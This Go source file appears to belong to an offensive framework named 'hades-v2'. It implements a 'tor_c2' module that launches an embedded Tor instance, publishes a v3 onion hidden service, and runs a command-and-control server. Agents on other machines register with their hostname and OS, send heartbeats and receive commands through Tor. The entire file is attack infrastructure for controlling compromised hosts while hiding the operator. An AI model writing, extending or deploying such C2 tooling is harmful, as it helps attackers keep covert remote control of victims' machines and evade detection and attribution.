package auxiliary

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"

	"hades-v2/internal/tor"
	"hades-v2/pkg/sdk"

	"gitlab.torproject.org/cerberus-droid/torgo/src/app/config"
	"gitlab.torproject.org/cerberus-droid/torgo/src/core"
	hsv3 "gitlab.torproject.org/cerberus-droid/torgo/src/feature/hs"
	"go.uber.org/zap"
)

type TorC2 struct {
	*sdk.BaseModule

	mu          sync.RWMutex
	torInstance *core.Tor
	torRunning  bool
	socksPort   int
	controlPort int
	dataDir     string

	c2Server  *tor.C2Server
	c2Port    int
	onionAddr string

	httpClient *http.Client
	agents     map[string]*AgentSession
	logger     *zap.Logger
}

type AgentSession struct {
	ID        string
	Info      tor.AgentInfo
	LastSeen  time.Time
	Connected bool
}

func NewTorC2() *TorC2 {
	return &TorC2{
		BaseModule: sdk.NewBaseModule(
			"tor_c2",
			"Tor-based C2 server with hidden service for agent callbacks",
			sdk.CategoryAuxiliary,
		),
		socksPort:   9050,
		controlPort: 9051,
		c2Port:      8089,
		dataDir:     "/tmp/hades-tor-c2",
		agents:      make(map[string]*AgentSession),
	}
}

func (tc *TorC2) Execute(ctx context.Context) error {
	tc.SetStatus(sdk.StatusRunning)
	defer tc.SetStatus(sdk.StatusIdle)

	if err := tc.startTor(ctx); err != nil {
		return fmt.Errorf("hades.tor_c2: failed to start Tor: %w", err)
	}

	if err := tc.startC2Server(ctx); err != nil {
		tc.shutdown()
		return fmt.Errorf("hades.tor_c2: failed to start C2 server: %w", err)
	}

	tc.mu.Lock()
	tc.torRunning = true
	tc.mu.Unlock()

	fmt.Printf("tor_c2: C2 server ready at %s\n", tc.onionAddr)
	fmt.Printf("tor_c2: use ./bin/hades tor-c2-status to see registered agents\n")

	<-ctx.Done()

	tc.shutdown()

	return nil
}

func (tc *TorC2) startTor(ctx context.Context) error {
	tc.mu.Lock()
	defer tc.mu.Unlock()

	if err := os.MkdirAll(tc.dataDir, 0755); err != nil {
		return fmt.Errorf("hades.tor_c2: failed to create data dir: %w", err)
	}

	logger, err := zap.NewDevelopment()
	if err != nil {
		return fmt.Errorf("hades.tor_c2: failed to create logger: %w", err)
	}
	tc.logger = logger

	cfg := &config.Config{
		SocksPort:      tc.socksPort,
		ControlPort:    tc.controlPort,
		DataDirectory:  tc.dataDir,
		LogLevel:       "info",
		LogFile:        "",
		BandwidthRate:  5 * 1024 * 1024,
		BandwidthBurst: 10 * 1024 * 1024,
		NumCPUs:        1,
		ConnLimit:      512,
		Control: config.ControlConfig{
			Enabled:    true,
			Addr:       fmt.Sprintf("127.0.0.1:%d", tc.controlPort),
			AuthMethod: "none",
		},
	}

	torInstance, err := core.NewTorWithConfig(cfg, logger)
	if err != nil {
		return fmt.Errorf("hades.tor_c2: failed to create Tor instance: %w", err)
	}

	if err := torInstance.Start(); err != nil {
		return fmt.Errorf("hades.tor_c2: failed to start Tor: %w", err)
	}

	tc.torInstance = torInstance

	time.Sleep(3 * time.Second)

	tc.httpClient = &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				dialer := &net.Dialer{}
				return dialer.DialContext(ctx, "tcp", fmt.Sprintf("127.0.0.1:%d", tc.socksPort))
			},
		},
		Timeout: 30 * time.Second,
	}

	fmt.Printf("tor_c2: Tor started on SOCKS %d, Control %d\n", tc.socksPort, tc.controlPort)
	return nil
}

func (tc *TorC2) startC2Server(ctx context.Context) error {
	tc.c2Server = tor.NewC2Server(tc.c2Port)
	tc.c2Server.SetHandler(tc)

	if err := tc.c2Server.Start(ctx); err != nil {
		return err
	}

	time.Sleep(2 * time.Second)

	onion, err := tc.createHiddenService(tc.c2Port)
	if err != nil {
		fmt.Printf("tor_c2: warning: failed to create hidden service: %v\n", err)
		onion = fmt.Sprintf("localhost:%d (hidden service pending)", tc.c2Port)
	}

	tc.mu.Lock()
	tc.onionAddr = onion
	tc.c2Server.SetOnionAddress(onion)
	tc.mu.Unlock()

	return nil
}

func (tc *TorC2) createHiddenService(port int) (string, error) {
	if tc.torInstance == nil {
		return "", fmt.Errorf("tor instance not initialized")
	}

	// Use the hidden service manager from Tor instance
	hsMgr := tc.torInstance.GetHiddenServiceManager()
	if hsMgr == nil {
		return "", fmt.Errorf("hidden service manager not available")
	}

	serviceDir := filepath.Join(tc.dataDir, "hidden_service")
	if err := os.MkdirAll(serviceDir, 0700); err != nil {
		return "", fmt.Errorf("failed to create service dir: %w", err)
	}

	ports := []hsv3.ServicePort{{
		VirtualPort:   80,
		TargetPort:    uint16(port),
		TargetAddress: "127.0.0.1",
	}}

	svc, err := hsMgr.CreateService("", ports, &hsv3.ServiceOptions{
		ServiceDir: serviceDir,
		Version:    3,
	})
	if err != nil {
		return "", fmt.Errorf("failed to create hidden service: %w", err)
	}

	// Start the service
	if err := hsMgr.StartService(svc.ServiceID); err != nil {
		tc.logger.Warn("failed to start hidden service immediately", zap.Error(err))
	}

	return svc.Address, nil
}

func (tc *TorC2) shutdown() {
	tc.mu.Lock()
	defer tc.mu.Unlock()

	if tc.c2Server != nil {
		tc.c2Server.Stop()
	}

	if tc.torInstance != nil {
		tc.torInstance.Stop()
		tc.torInstance = nil
	}

	if tc.logger != nil {
		tc.logger.Sync()
	}

	tc.torRunning = false
	fmt.Println("tor_c2: shutdown complete")
}

func (tc *TorC2) IsRunning() bool {
	tc.mu.RLock()
	defer tc.mu.RUnlock()
	return tc.torRunning
}

func (tc *TorC2) GetOnionAddress() string {
	tc.mu.RLock()
	defer tc.mu.RUnlock()
	return tc.onionAddr
}

func (tc *TorC2) GetSocksAddr() string {
	tc.mu.RLock()
	defer tc.mu.RUnlock()
	return fmt.Sprintf("127.0.0.1:%d", tc.socksPort)
}

func (tc *TorC2) GetHTTPClient() *http.Client {
	tc.mu.RLock()
	defer tc.mu.RUnlock()
	return tc.httpClient
}

func (tc *TorC2) ListAgents() map[string]*AgentSession {
	tc.mu.RLock()
	defer tc.mu.RUnlock()
	return tc.agents
}

func (tc *TorC2) SendCommandToAgent(ctx context.Context, agentID, cmd string) ([]byte, error) {
	client := tor.NewC2Client(tc.onionAddr)
	client.SetSocksProxy(tc.GetSocksAddr())
	return client.SendCommand(ctx, cmd)
}

func (tc *TorC2) HandleCommand(ctx context.Context, agentID string, cmd []byte) ([]byte, error) {
	fmt.Printf("tor_c2: received command for agent %s: %s\n", agentID, string(cmd))

	return []byte(fmt.Sprintf("command received: %s", string(cmd))), nil
}

func (tc *TorC2) RegisterAgent(ctx context.Context, info tor.AgentInfo) error {
	tc.mu.Lock()
	defer tc.mu.Unlock()

	tc.agents[info.ID] = &AgentSession{
		ID:        info.ID,
		Info:      info,
		LastSeen:  time.Now(),
		Connected: true,
	}

	fmt.Printf("tor_c2: agent registered: %s (%s@%s)\n", info.ID, info.Hostname, info.OS)
	return nil
}

func (tc *TorC2) Heartbeat(ctx context.Context, agentID string) error {
	tc.mu.Lock()
	defer tc.mu.Unlock()

	if agent, ok := tc.agents[agentID]; ok {
		agent.LastSeen = time.Now()
	}
	return nil
}

func (tc *TorC2) GetTorClient() *http.Client {
	tc.mu.RLock()
	defer tc.mu.RUnlock()
	return tc.httpClient
}

func (tc *TorC2) NewRequestThroughTor(ctx context.Context, method, url string, body io.Reader) (*http.Response, error) {
	client := tc.GetTorClient()
	if client == nil {
		return nil, fmt.Errorf("hades.tor_c2: Tor client not initialized")
	}

	req, err := http.NewRequestWithContext(ctx, method, url, body)
	if err != nil {
		return nil, err
	}

	return client.Do(req)
}

func (tc *TorC2) CreateCallbackURL(path string) string {
	tc.mu.RLock()
	defer tc.mu.RUnlock()
	return fmt.Sprintf("http://%s%s", tc.onionAddr, path)
}
